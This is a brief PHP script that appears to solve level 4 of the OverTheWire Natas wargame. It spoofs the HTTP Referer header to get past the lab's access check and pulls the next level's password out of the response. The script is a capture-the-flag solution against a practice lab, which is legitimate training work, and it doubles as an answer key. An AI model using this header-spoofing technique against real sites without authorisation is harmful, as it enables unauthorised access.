<?php

require_once dirname(__DIR__) . '/bootstrap.php';

$level = 4;
$username = 'natas' . $level;
$password = readFlag($level - 1);

$url = sprintf('http://%s.natas.labs.overthewire.org/', $username);

$response = $client->request('GET', $url, [
    'auth' => [$username, $password],
    'headers' => [
        'Referer' => 'http://natas5.natas.labs.overthewire.org/',
    ]
]);

$body = (string)$response->getBody();
preg_match('/Access granted\. The password for natas5 is (.*)/', $body, $flag);
echo $flag[1];
